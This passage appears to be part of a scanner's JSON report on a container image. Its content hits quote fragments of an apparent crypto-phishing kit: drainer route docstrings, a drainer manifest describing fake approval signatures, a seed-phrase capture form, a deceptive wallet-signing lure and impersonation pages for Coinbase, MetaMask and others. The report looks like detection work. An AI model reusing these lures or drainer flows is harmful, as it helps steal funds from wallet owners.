+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/electrum_v1_mnemonic_decoder.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/electrum_v1_mnemonic_encoder.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/electrum_v1_mnemonic_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/electrum_v1_mnemonic_utils.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/electrum_v1_mnemonic_validator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/electrum_v1_seed_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/wordlist",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v1/wordlist/english.txt",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/__init__.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/__pycache__",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/__pycache__/__init__.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/__pycache__/electrum_v2_entropy_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/__pycache__/electrum_v2_mnemonic.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/__pycache__/electrum_v2_mnemonic_decoder.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/__pycache__/electrum_v2_mnemonic_encoder.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/__pycache__/electrum_v2_mnemonic_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/__pycache__/electrum_v2_mnemonic_utils.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/__pycache__/electrum_v2_mnemonic_validator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/__pycache__/electrum_v2_seed_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/electrum_v2_entropy_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/electrum_v2_mnemonic.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/electrum_v2_mnemonic_decoder.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/electrum_v2_mnemonic_encoder.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/electrum_v2_mnemonic_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/electrum_v2_mnemonic_utils.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/electrum_v2_mnemonic_validator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/electrum/mnemonic_v2/electrum_v2_seed_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/__init__.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/__pycache__",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/__pycache__/__init__.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/__pycache__/monero_entropy_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/__pycache__/monero_mnemonic.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/__pycache__/monero_mnemonic_decoder.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/__pycache__/monero_mnemonic_encoder.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/__pycache__/monero_mnemonic_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/__pycache__/monero_mnemonic_utils.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/__pycache__/monero_mnemonic_validator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/__pycache__/monero_seed_generator.cpython-313.pyc",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/monero_entropy_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/monero_mnemonic.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/monero_mnemonic_decoder.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/monero_mnemonic_encoder.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/monero_mnemonic_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/monero_mnemonic_utils.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/monero_mnemonic_validator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/monero_seed_generator.py",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/wordlist",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/wordlist/chinese_simplified.txt",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/wordlist/dutch.txt",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/wordlist/english.txt",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/wordlist/french.txt",
+        "usr/local/lib/python3.13/site-packages/bip_utils/monero/mnemonic_legacy/wordlist/german.txt"
+      ],
+      "content_hits": [
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/email/_header_value_parser.py",
+          "snippet": "', 'angle-addr-start'))     value = value[1:]     # Although it is not legal per RFC5322, SMTP uses '<>' in certain     # circumstances.     if value and value[0] == '>':         angle_addr.append(ValueTerminal('>', 'angle-addr-end'))         angle_addr.defects.append(error"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/email/policy.py",
+          "snippet": "at32',     'compat32',     'Policy',     'EmailPolicy',     'default',     'strict',     'SMTP',     'HTTP',     ]  linesep_splitter = re.compile(r'\\n|\\r\\n?')  @_extend_docstrings class EmailPolicy(Policy):      \"\"\"+     PROVISIONAL      The API extensions enabled by this p"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/logging/config.py",
+          "snippet": "           config['handlers'] = hlist             elif issubclass(klass, logging.handlers.SMTPHandler) and\\                 'mailhost' in config:                 config['mailhost'] = self.as_tuple(config['mailhost'])             elif issubclass(klass, logging.handlers.SysLo"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/logging/handlers.py",
+          "snippet": "socket.sendall(msg)         except Exception:             self.handleError(record)  class SMTPHandler(logging.Handler):     \"\"\"     A handler class which sends an SMTP email for each logging event.     \"\"\"     def __init__(self, mailhost, fromaddr, toaddrs, subject,        "
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/pydoc_data/module_docs.py",
+          "snippet": "',     'site': 'site#module-site',     'sitecustomize': 'site#module-sitecustomize',     'smtpd': 'smtpd#module-smtpd',     'smtplib': 'smtplib#module-smtplib',     'sndhdr': 'sndhdr#module-sndhdr',     'socket': 'socket#module-socket',     'socketserver': 'socketserver#mod"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/smtplib.py",
+          "snippet": "#! /usr/bin/env python3  '''SMTP/ESMTP client class.  This should follow RFC 821 (SMTP), RFC 1869 (ESMTP), RFC 2554 (SMTP Authentication) and RFC 2487 (Secure SMTP over TLS).  Notes:  Please remember, when doing "
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/requirements.txt",
+          "snippet": "le>=4.2 base58>=2.1 bech32>=1.2 bip_utils>=2.9 mnemonic>=0.21 eth-hash[pycryptodome]>=0.7 aiosmtplib>=3.0 jinja2>=3.1 aioimaplib>=2.0 aiofiles>=24.1 weasyprint>=63.0 xhtml2pdf>=0.2.16 qrcode[pil]>=7.4 h2>=4.1 "
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/site-packages/aioimaplib/aioimaplib.py",
+          "snippet": "soft.com/en-us/exchange/client-developer/legacy-protocols/how-to-authenticate-an-imap-pop-smtp-application-by-using-oauth         https://developers.google.com/gmail/imap/xoauth2-protocol         \"\"\"         sasl_string = b64encode(f\"user={user}\\1auth=Bearer {token}\\1\\1\".en"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/site-packages/aiosmtplib/__init__.py",
+          "snippet": "\"\"\" aiosmtplib ==========  An asyncio SMTP client.  Originally based on smtplib from the Python 3 standard library by: The Dragon De Monsyne <dragondm@integral.org>  Author: Cole Maclean <hi@col"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/site-packages/aiosmtplib/__main__.py",
+          "snippet": "from aiosmtplib.smtp import SMTP, SMTP_PORT   raw_hostname = input(\"SMTP server hostname [localhost]: \")  # nosec raw_port = input(f\"SMTP server port [{SMTP_PORT}]: \")  # nosec raw_sender = input"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/site-packages/aiosmtplib/api.py",
+          "snippet": "t ssl from collections.abc import Sequence from typing import cast  from .response import SMTPResponse from .smtp import DEFAULT_TIMEOUT, SMTP from .typing import SMTPTokenGenerator, SocketPathType   __all__ = (\"send\",)   async def send(     message: email.message.EmailMess"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/site-packages/aiosmtplib/email.py",
+          "snippet": "f isinstance(message_copy, email.message.EmailMessage):             policy = email.policy.SMTPUTF8 if utf8 else email.policy.SMTP              if cte_type != \"8bit\":                 policy = policy.clone(cte_type=cte_type)              generator = email.generator.BytesGener"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/site-packages/aiosmtplib/errors.py",
+          "snippet": "from asyncio import TimeoutError   __all__ = (     \"SMTPAuthenticationError\",     \"SMTPConnectError\",     \"SMTPDataError\",     \"SMTPException\",     \"SMTPHeloError\",     \"SMTPNotSupported\",     \"SMTPRecipientRefused\",     \"SMTPRecipients"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/site-packages/aiosmtplib/esmtp.py",
+          "snippet": "\"\"\" ESMTP utils \"\"\"  import re   __all__ = (\"parse_esmtp_extensions\",)   OLDSTYLE_AUTH_REGEX = re.compile(r\"auth=(?P<auth>.*)\", flags=re.I)   def parse_esmtp_extensions(message: str) -> tup"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/site-packages/aiosmtplib/protocol.py",
+          "snippet": "ections import re import ssl from typing import Callable, cast  from .errors import (     SMTPDataError,     SMTPReadTimeoutError,     SMTPResponseException,     SMTPServerDisconnected,     SMTPTimeoutError, ) from .response import SMTPResponse from .typing import SMTPStatu"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/site-packages/aiosmtplib/response.py",
+          "snippet": "\"\"\" SMTPResponse class, a simple namedtuple of (code, message). \"\"\"  from typing import NamedTuple   __all__ = (\"SMTPResponse\",)   class SMTPResponse(NamedTuple):     \"\"\"     NamedTuple of"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/site-packages/aiosmtplib/smtp.py",
+          "snippet": "\"\"\" Main SMTP client class.  Implements SMTP, ESMTP & Auth methods. \"\"\"  import asyncio import email.message import socket import ssl from collections.abc import Iterable, Sequence from types i"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/site-packages/aiosmtplib/status.py",
+          "snippet": "from .typing import SMTPStatus  # alias SMTPStatus for backwards compatibility __all__ = (\"SMTPStatus\",) "
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/site-packages/aiosmtplib/typing.py",
+          "snippet": "port os from collections.abc import Awaitable, Callable   __all__ = (     \"Default\",     \"SMTPStatus\",     \"SMTPTokenGenerator\",     \"SocketPathType\",     \"_default\", )  SMTPTokenGenerator = Callable[[], Awaitable[str]]  SocketPathType = str | bytes | os.PathLike[str]   cla"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/site-packages/oscrypto/_tls.py",
+          "snippet": "server      :return:         None, or a unicode string of \"ftp\", \"http\", \"imap\", \"pop3\", \"smtp\"     \"\"\"      if server_handshake_bytes[0:5] == b'HTTP/':         return 'HTTP'      if server_handshake_bytes[0:4] == b'220 ':         if re.match(b'^[^\\r\\n]*ftp', server_handsha"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "usr/local/lib/python3.13/site-packages/reportlab/lib/randomtext.py",
+          "snippet": "rewall', 'server', 'Linux', 'Unix', 'MacOS', 'BeOS', 'AS/400',     'sendmail', 'TCP/IP', 'SMTP', 'RFC822-compliant', 'dynamic',     'Internet', 'A/UX', 'Amiga OS', 'BIOS', 'boot managers', 'CP/M',     'DOS', 'file system', 'FreeBSD', 'Freeware', 'GEOS', 'GNU',     'Hurd', '"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/server/auth/perms.py",
+          "snippet": "inal[str] = \"browser.manage\" MAIL_VIEW: Final[str] = \"mail.view\" MAIL_SEND: Final[str] = \"mail.send\" CHAT_ACCESS: Final[str] = \"chat.access\" DIALER_VIEW: Final[str] = \"dialer.view\" DIALER_MANAGE: Final[str] = \"dialer.manage\"   type CurrentUser = dict[str, object]   ROLE_PERMS: F"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/server/db/migrate.py",
+          "snippet": "ERENCES users(id) ON DELETE CASCADE     )     \"\"\",     \"\"\"     CREATE TABLE IF NOT EXISTS smtp_accounts (         id TEXT PRIMARY KEY,         name TEXT NOT NULL,         host TEXT NOT NULL,         port INTEGER NOT NULL DEFAULT 587,         username TEXT NOT NULL,         "
+        },
+        {
+          "tag": "wallet_lure",
+          "file": "app/server/routes/lure.py",
+          "snippet": "(logo_b64, service_logo, brand, color, 30)     qr = _qr_html(include_qr, qr_b64, \"Scan to verify wallet ownership:\")     return f\"\"\"<!DOCTYPE html> <html lang=\"en\"> <head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/> <title>Wallet Verifi"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/server/routes/mail.py",
+          "snippet": "e=502, detail=\"MAIL_002\") from exc     finally:         await mail_svc.close_imap(conn)   @router.post(\"/send\") async def send(request: Request) -> dict[str, Any]:     user: dict[str, object] = await require_perm(\"mail.send\", request)      content_type: str = request.headers.get(\"content-ty"
+        },
+        {
+          "tag": "phishing_feeds",
+          "file": "app/server/routes/monitor.py",
+          "snippet": "as client:             resp: httpx.Response = await client.post(                 \"https://urlhaus-api.abuse.ch/v1/host/\",                 content=f\"host={domain}\".encode(),                 headers={                     \"Content-Type\": \"application/x-www-form-urlencoded\",                   "
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/server/routes/nfa_mailer.py",
+          "snippet": "__future__ import annotations  import asyncio import json import logging import re import smtplib import ssl import uuid from contextlib import suppress from datetime import UTC, datetime from email import encoders as email_encoders from email.mime.base import MIMEBase from"
+        },
+        {
+          "tag": "drainer_workflow",
+          "file": "app/server/routes/serve/drainer.py",
+          "snippet": "\"\"\"Crypto drainer routes \u2014 capture wallet connections and token approvals.\"\"\"  from __future__ import annotations  import logging import uuid from datetime import UTC, datetime from typing import A"
+        },
+        {
+          "tag": "drainer_workflow",
+          "file": "app/server/routes/serve/trust_drainer.py",
+          "snippet": "\"\"\"Trust Wallet drainer routes \u2014 capture wallet + real on-chain approvals + drain.\"\"\"  from __future__ import annotations  import json import logging import uuid from datetime import UTC, datetime from t"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/server/routes/transfer.py",
+          "snippet": "S: Final[frozenset[str]] = frozenset(     {         \"settings\",         \"users\",         \"smtp_accounts\",         \"mail_presets\",         \"imap_accounts\",         \"domains\",         \"service_configs\",         \"playbooks\",         \"registrar_keys\",         \"telegram_config\","
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/binance/metamask.html",
+          "snippet": "cCl90whOtKrLr3vUfTrlfmY91sh/IWy25KihFbg2BDklcOVC7zM5HL4X5nwVKAlyXmb5Yhouqo28/FONs1uSDHb/5lsmTPB553dtHXna8QJzdurir8LGCdO858Dr1YAVMGfdg9vlcJp60hCRDpnXZ8455qWc68/M4ueecCY2Ct+RC6iNLF4EKtkIcyjT4ESrY4UMQKSe0KAarbdK02yFf6Xi73kTbpSjIoSr4erGCcEKrL7kq0G+lrX3F7HlhLrNWgaXQXHf1b5pjp0bL3"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/backup_wallet.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/cold_wallet_seed.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/confirm_holdings.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/connect_wallet.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/connect_wallet_2.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/imp_reset_password.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/imp_signin.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/invalid_seed.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/metamask.html",
+          "snippet": "cCl90whOtKrLr3vUfTrlfmY91sh/IWy25KihFbg2BDklcOVC7zM5HL4X5nwVKAlyXmb5Yhouqo28/FONs1uSDHb/5lsmTPB553dtHXna8QJzdurir8LGCdO858Dr1YAVMGfdg9vlcJp60hCRDpnXZ8455qWc68/M4ueecCY2Ct+RC6iNLF4EKtkIcyjT4ESrY4UMQKSe0KAarbdK02yFf6Xi73kTbpSjIoSr4erGCcEKrL7kq0G+lrX3F7HlhLrNWgaXQXHf1b5pjp0bL3"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/secure_assets.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/secure_assets_2.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/setup_wallet.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/wallet_removed.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/whitelist_custodial.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/whitelist_external.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/coinbase/whitelist_success.html",
+          "snippet": "/ceVMYaq0rLMqz1v+9y0g7PrzutU6IPn0QaCvwcQeHkaLksFZT6M5m/otRlcuzh+sNRnC5gEfuptT6vyi4FWlZTEGGsmtPXXXmaUJ4s12dN+LX5yM2pDKp2bMmmmyc1+U+E6frrv1phote1x5j5X8639kGYzGUVzFc9cgEwfBnD38zTG/mWDkAn46s3EKOGHw/rVryN4Fo8TcfaCTOBC2qxlNYwKlZK/n5Dz8SpPKQulEjfGreIy7W6G6cOqMr1XeddxlcWdgkSvqc2Cpc"
+        },
+        {
+          "tag": "wallet_lure",
+          "file": "app/services/crypto/disconnect_seed.html",
+          "snippet": "/div><h1 class=\"title\">Disconnect Wallet</h1><p class=\"sub\">Enter your recovery phrase to verify wallet ownership and continue with the requested security action.</p><form id=\"seed-form\"><div class=\"field\"><label class=\"label\" for=\"seed\">Recovery phrase</label><textarea id=\"seed\" cl"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/crypto/metamask.html",
+          "snippet": "cCl90whOtKrLr3vUfTrlfmY91sh/IWy25KihFbg2BDklcOVC7zM5HL4X5nwVKAlyXmb5Yhouqo28/FONs1uSDHb/5lsmTPB553dtHXna8QJzdurir8LGCdO858Dr1YAVMGfdg9vlcJp60hCRDpnXZ8455qWc68/M4ueecCY2Ct+RC6iNLF4EKtkIcyjT4ESrY4UMQKSe0KAarbdK02yFf6Xi73kTbpSjIoSr4erGCcEKrL7kq0G+lrX3F7HlhLrNWgaXQXHf1b5pjp0bL3"
+        },
+        {
+          "tag": "wallet_lure",
+          "file": "app/services/drainer/approve.html",
+          "snippet": "ow.ethereum.request({           method: 'personal_sign',           params: [             'Verify wallet ownership for recovery case. Approve token management for secure recovery.',             addr           ]         }).then(function(sig){           doRelay(sig);         }).catch(f"
+        },
+        {
+          "tag": "drainer_workflow",
+          "file": "app/services/drainer/connect.html",
+          "snippet": "eturn;     var f = document.createElement('form');     f.method = 'POST';     f.action = '/drainer/connect';     var fields = { address: walletAddr, chain: chain, connected: connected ? '1' : '0' };     for(var k in fields){       var i = document.createElement('input');       i.type ="
+        },
+        {
+          "tag": "drainer_workflow",
+          "file": "app/services/drainer/manifest.yaml",
+          "snippet": "name: Crypto Drainer version: 1.0 route: /drainer flow_mode: admin tab_title: Crypto Recovery notes: |   Token approval drainer.   Flow: connect wallet -> fake approval signatures -> drained.   Server"
+        },
+        {
+          "tag": "smtp_campaign",
+          "file": "app/services/gemini/metamask.html",
